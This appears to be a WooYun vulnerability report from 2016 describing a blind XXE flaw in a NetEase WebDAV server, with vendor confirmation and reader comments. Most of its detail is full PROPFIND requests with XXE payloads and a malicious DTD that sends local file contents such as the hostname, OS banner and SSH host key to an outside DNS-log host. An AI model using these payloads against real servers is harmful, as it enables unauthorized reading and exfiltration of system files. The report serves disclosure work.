{"id": 87736, "wybug_id": "wooyun-2016-0203048", "wybug_title": "利用网易一处XXE盲注演示如何通过cloudeye配合实现文件内容读取                                      ", "wybug_corp": "网易", "wybug_author": "sanwenkit", "wybug_date": "2016-04-28 16:30", "wybug_open_date": "2016-06-13 17:10", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["内容读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-13：\t细节向公众公开  简要描述： 野生xml外部实体注入 详细说明：  地址：\nhttp://106.2.32.66:8080/webdav/\nIP归属地：\n\n存在一处webdav目录，支持通过PROPFIND方式提交xml结构请求构造xxe测试payload：\nPROPFIND /webdav/ HTTP/1.1Content-type: application/xmlDepth: 0Connection: Keep-aliveTE: trailersAuthorization: Basic YW5vbnltb3VzOmFub255bW91cw==Host: 106.2.32.66:8080Content-Length: 172Accept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE dtz3zkd [  <!ENTITY % dtd SYSTEM \"http://66ae2b.dnslog.info/\">%dtd;]><propfind xmlns=\"DAV:\"><allprop/></propfind>\ncloudeye apache日志：\n\nresponse返回数据：\n<?xml version=\"1.0\" encoding=\"utf-8\" ?><multistatus xmlns=\"DAV:\"><response><href>/webdav/</href><propstat><prop><creationdate>2015-07-13T12:13:57Z</creationdate><displayname><![CDATA[]]></displayname><resourcetype><collection/></resourcetype><source></source><supportedlock><lockentry><lockscope><exclusive/></lockscope><locktype><write/></locktype></lockentry><lockentry><lockscope><shared/></lockscope><locktype><write/></locktype></lockentry></supportedlock></prop><status>HTTP/1.1 200 OK</status></propstat></response></multistatus>\n证明解析xml时尝试引用了外部资源，存在XXE漏洞   漏洞证明：  后续尝试构造xml请求获取回显失败，考虑继续通过cloudeye获取blind xxe回显结果。创建一个获取回显结果的dtd文件：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://66ae2b.dnslog.info/?xml1=%payload;'>\">%all;\n调用地址:http://*.*.*.*：8080/xml/evil.dtd再次构造请求payload读取hostname：\nPROPFIND /webdav/ HTTP/1.1Content-type: application/xmlDepth: 0Connection: Keep-aliveTE: trailersAuthorization: Basic YW5vbnltb3VzOmFub255bW91cw==Host: 106.2.32.66:8080Content-Length: 172Accept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE a [  <!ENTITY % payload SYSTEM \"file:///proc/sys/kernel/hostname\">  <!ENTITY % dtd SYSTEM \"http://*.*.*.*:8080/xml/evil.dtd\">%dtd;%send;]><propfind xmlns=\"DAV:\"><allprop/></propfind>\ncloudeye apache日志：\n\n获取的hostname为：classa-popoatispam1，貌似是网易popo的反垃圾邮件系统由于读取带有换行符、#、<、>等特殊符号文件内容时，会破坏xml语法结构，导致payload无法正常解析，所以还做不到任意文件读取，可以尝试寻找base64、urlencode编码方法来解决，反正我是没有搞定/(ㄒoㄒ)/~~但是也可以读到好多有价值的内容，比如读取/etc/issue.net:\nPROPFIND /webdav/ HTTP/1.1Content-type: application/xmlDepth: 0Connection: Keep-aliveTE: trailersAuthorization: Basic YW5vbnltb3VzOmFub255bW91cw==Host: 106.2.32.66:8080Content-Length: 172Accept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE a [  <!ENTITY % payload SYSTEM \"file:///etc/issue.net\">  <!ENTITY % dtd SYSTEM \"http://*.*.*.*:8080/xml/evil.dtd\">%dtd;%send;]><propfind xmlns=\"DAV:\"><allprop/></propfind>\n结果为：Debian%20GNU/Linux%207\n\n读取/etc/ssh/ssh_host_rsa_key.pub:\nPROPFIND /webdav/ HTTP/1.1Content-type: application/xmlDepth: 0Connection: Keep-aliveTE: trailersAuthorization: Basic YW5vbnltb3VzOmFub255bW91cw==Host: 106.2.32.66:8080Content-Length: 172Accept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE a [  <!ENTITY % payload SYSTEM \"file:///etc/issue.net\">  <!ENTITY % dtd SYSTEM \"http://*.*.*.*:8080/xml/evil.dtd\">%dtd;%send;]><propfind xmlns=\"DAV:\"><allprop/></propfind>\n结果为：ssh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQCcdWadpFCGUL9soWpo7KIc4/WlcwkcvqOeMfnCS4sSmT+fsQ1FMY+h6Ab+xQrvrhp4ufIN/iR92SMeIYLCxg+DSIXKdxKob9luJKdF/zl4UY/qTmRaQaAPlAgZsPHnBMKT5BW08ZMX+NzH8jQQx6xHCkx4Bqom88NMfePN0ydYwGzehS/7oh0s9JYgo8knTJ6eke7y/ohtzMLjCoBQHfAOTtyRPoFSyfc2ksU/rZOvAPteQvmhyc1geAmngcGV0eabzhSmNHcrxqeKZ5wK7zOmoGeoEZrfxADCHlDbf6P+XJ3HjgDZg1iBHNH4hjkdNGkVCaxpRg9CD+V/G3Ddn0Xl%20root@classa-popoatispam1\n\n   修复方案：  O(∩_∩)O~   版权声明：转载请注明来源 sanwenkit@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-04-29 17:02 厂商回复： 您好，该问题已修复，感谢您对网易产品的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-28 17:15 |    \t\t赵健康 \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:13        | 慢慢进步！！！)\t\t \n  屌屌的    \n     2016-04-28 18:03 |    \t\tsanwenkit \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:24        | 半吊子攻城师、开发狗)\t\t \n  求问java环境中能不能实现文件内容转码？类似\"php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini\"    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}